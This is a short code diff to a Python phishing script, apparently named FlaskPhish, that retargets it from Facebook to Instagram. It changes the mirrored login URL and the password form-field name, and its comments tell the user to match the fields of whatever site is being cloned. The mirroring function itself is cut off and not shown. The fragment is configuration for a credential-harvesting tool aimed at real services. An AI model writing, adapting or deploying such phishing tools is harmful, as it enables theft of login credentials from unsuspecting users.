@@ -6,10 +6,10 @@ import requests
 def FlaskPhish():
 ########################################################################
 ########### WHATEVER URL HERE ##########################################
-    url = 'https://www.facebook.com' ###################################
+    url = 'https://www.instagram.com/' ###################################
 ####### CHANGE THESE FIELDS TO WHATEVER THEY ARE ARE IN THE WEBSITE ####
     field1 = 'email' ## USERNAME FIELD #################################
-    field2 = 'pass'  ## PASSWORD FIELD #################################
+    field2 = 'password'  ## PASSWORD FIELD #################################
 ########################################################################
 
     def mirror():
